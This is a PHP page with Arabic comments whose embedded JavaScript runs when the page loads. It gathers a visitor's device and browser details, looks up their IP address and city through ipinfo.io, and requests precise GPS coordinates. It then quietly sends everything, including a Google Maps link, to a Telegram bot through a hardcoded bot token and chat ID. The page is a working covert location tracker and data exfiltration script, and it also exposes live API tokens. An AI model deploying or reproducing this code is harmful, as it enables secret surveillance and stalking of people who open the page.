<?php
session_start();

// التحقق من حالة تسجيل الدخول
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    echo "غير مسموح بالوصول إلى هذه الصفحة.";
    exit;
}
?>

<script>
    // دالة لاستخراج بيانات الجهاز والمتصفح
    function getDeviceInfo() {
        const userAgent = navigator.userAgent;  // معلومات المتصفح
        const platform = navigator.platform;    // نوع الجهاز (نظام التشغيل)
        const language = navigator.language;    // لغة المتصفح
        const screenWidth = screen.width;       // عرض الشاشة
        const screenHeight = screen.height;     // ارتفاع الشاشة
        const isOnline = navigator.onLine;      // حالة الاتصال بالإنترنت
        const localTime = new Date().toLocaleString();  // الوقت المحلي
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;  // المنطقة الزمنية
        const windowWidth = window.innerWidth;  // عرض نافذة المتصفح
        const windowHeight = window.innerHeight;  // ارتفاع نافذة المتصفح
        const prefersDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;  // الوضع الليلي
        
        // معلومات حول نوع الجهاز
        let deviceType = "غير معروف";
        let osVersion = "غير معروف";
        let model = "غير معروف";
    
        // تحليل `userAgent` للحصول على معلومات حول نوع الجهاز
        if (/iPhone/.test(userAgent)) {
            deviceType = "iPhone";
            osVersion = /OS (\d+_\d+)/.exec(userAgent)[1].replace('_', '.');  // استخراج إصدار iOS
            model = /iPhone (\d+)/.test(userAgent) ? `iPhone ${RegExp.$1}` : "iPhone";
        } else if (/iPad/.test(userAgent)) {
            deviceType = "iPad";
            osVersion = /OS (\d+_\d+)/.exec(userAgent)[1].replace('_', '.');  // استخراج إصدار iOS
            model = "iPad";
        } else if (/Android/.test(userAgent)) {
            deviceType = "Android";
            osVersion = /Android (\d+\.\d+)/.exec(userAgent) ? RegExp.$1 : "غير معروف";
            model = /Samsung/.test(userAgent) ? "Samsung Galaxy" : "Android جهاز آخر";
        } else if (/Windows NT/.test(userAgent)) {
            deviceType = "Windows";
            osVersion = /Windows NT (\d+\.\d+)/.exec(userAgent)[1];  // استخراج إصدار Windows
            model = "جهاز Windows";
        } else if (/Mac OS X/.test(userAgent)) {
            deviceType = "Mac OS";
            osVersion = /Mac OS X (\d+_\d+)/.exec(userAgent)[1].replace('_', '.');  // استخراج إصدار Mac OS
            model = "Mac";
        }
    
        // معلومات حول الجهاز والمتصفح
        return {
            userAgent: userAgent,  // المتصفح
            platform: platform,    // نوع الجهاز
            language: language,    // اللغة
            screenWidth: screenWidth,  // عرض الشاشة
            screenHeight: screenHeight, // ارتفاع الشاشة
            isOnline: isOnline,        // حالة الاتصال بالإنترنت
            localTime: localTime,     // الوقت المحلي
            timezone: timezone,      // المنطقة الزمنية
            windowWidth: windowWidth, // عرض نافذة المتصفح
            windowHeight: windowHeight, // ارتفاع نافذة المتصفح
            prefersDarkMode: prefersDarkMode,  // الوضع الليلي
            deviceType: deviceType,  // نوع الجهاز
            osVersion: osVersion,    // إصدار نظام التشغيل
            model: model             // موديل الجهاز
        };
    }
    
    // دالة للحصول على عنوان الـ IP والدولة باستخدام ipinfo.io
    function getIpAndLocation() {
        return fetch('https://ipinfo.io/json?token=4bb90fc2af2278')  // استبدل بـ API Token الخاص بك
            .then(response => response.json())
            .then(data => {
                return {
                    ip: data.ip,
                    country: data.country,   // الدولة
                    city: data.city,         // المدينة
                    region: data.region,     // المنطقة
                    loc: data.loc            // الموقع الجغرافي (خطوط العرض والطول)
                };
            });
    }
    
    // دالة للحصول على الموقع الجغرافي (خطوط العرض والطول) باستخدام Geolocation API
    function getGeolocation() {
        return new Promise((resolve, reject) => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        resolve({ latitude, longitude });
                    },
                    (error) => reject(error)
                );
            } else {
                reject('Geolocation is not supported by this browser.');
            }
        });
    }
    
    // دالة لإرسال البيانات إلى تلجرام
    function sendToTelegram(data) {
        const botToken = '7593089397:AAHe-ktv3blJ0hOAmZ_FfyEXiYV0L3Y5rB4';  // استبدل هذا بـ Token الخاص بك
        const chatId = '5796466989';  // استبدل هذا بمعرف المحادثة الخاص بك
    
        let message = `عنوان الـ IP: ${data.ip}\nالدولة: ${data.country}\nالمدينة: ${data.city}\nالمنطقة: ${data.region}\n`;
        message += `الجهاز: ${data.deviceType} ${data.model}\nنظام التشغيل: ${data.osVersion}\nالمتصفح: ${data.userAgent}\nاللغة: ${data.language}\n`;
        message += `دقة الشاشة: ${data.screenWidth}x${data.screenHeight}\nحالة الاتصال بالإنترنت: ${data.isOnline ? 'متصّل' : 'غير متصل'}\n`;
        message += `الوقت المحلي: ${data.localTime}\nالمنطقة الزمنية: ${data.timezone}\n`;
        message += `حجم النافذة: ${data.windowWidth}x${data.windowHeight}\nالوضع الليلي: ${data.prefersDarkMode ? 'مفعل' : 'غير مفعل'}`;
    
        // إضافة رابط خرائط جوجل مع خطوط العرض والطول إذا كانت موجودة
        if (data.latitude && data.longitude) {
            const googleMapsLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
            message += `\nرابط الموقع في خرائط جوجل: ${googleMapsLink}`;
        }
    
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        })
        .then(response => response.json())
        .then(data => console.log('Message sent:', data))
        .catch(error => console.error('Error:', error));
    }
    
    // جمع البيانات من الجهاز والموقع
    async function collectAndSendData() {
        const deviceInfo = getDeviceInfo();
        const locationInfo = await getIpAndLocation();
    
        // إضافة مؤقت 6 ثوانٍ لانتظار الموقع الجغرافي
        let geolocation = null;
        const geolocationPromise = getGeolocation().catch(err => console.error('Geolocation error:', err));
    
        // انتظر 6 ثوانٍ
        const timeout = new Promise((resolve) => setTimeout(resolve, 6000));
    
        // تنفيذ الوعدين معًا
        await Promise.race([geolocationPromise, timeout]).then(result => {
            // إذا تم الحصول على الموقع الجغرافي
            if (result && result.latitude && result.longitude) {
                geolocation = result;
            }
        });
    
        const allData = {
            ...deviceInfo,
            ...locationInfo,
            ...geolocation
        };
    
        sendToTelegram(allData);
    }
    
    // جمع البيانات وإرسالها
    collectAndSendData();
    
   
</script>